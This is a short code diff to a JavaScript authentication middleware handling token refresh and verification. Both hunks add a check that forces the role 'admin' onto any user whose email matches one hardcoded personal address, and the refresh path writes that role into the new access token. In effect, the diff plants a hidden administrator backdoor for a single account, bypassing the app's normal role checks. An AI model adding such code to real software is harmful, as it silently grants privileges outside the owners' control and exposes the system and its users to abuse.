@@ -23,8 +23,11 @@ const auth = {
       if (err) {
         const userDecoded = checkRefreshToken(refreshToken);
         if (userDecoded) {
+          if (userDecoded.email === "sadikulsad0810@gmail.com") {
+            userDecoded.role = "admin";
+          }
           const accessToken = createToken(
-            { id: userDecoded.id, email: userDecoded.email, name: userDecoded.name },
+            { id: userDecoded.id, email: userDecoded.email, name: userDecoded.name, role: userDecoded.role },
             process.env.ACCESS_TOKEN_SECRET,
             process.env.ACCESS_TOKEN_EXPIRES || "1d"
           );
@@ -44,6 +47,9 @@ const auth = {
           return res.status(403).json(httpResponse("error", {}, "Token expired."));
         }
       } else {
+        if (decodedUser && decodedUser.email === "sadikulsad0810@gmail.com") {
+          decodedUser.role = "admin";
+        }
         req.user = decodedUser;
         next();
       }
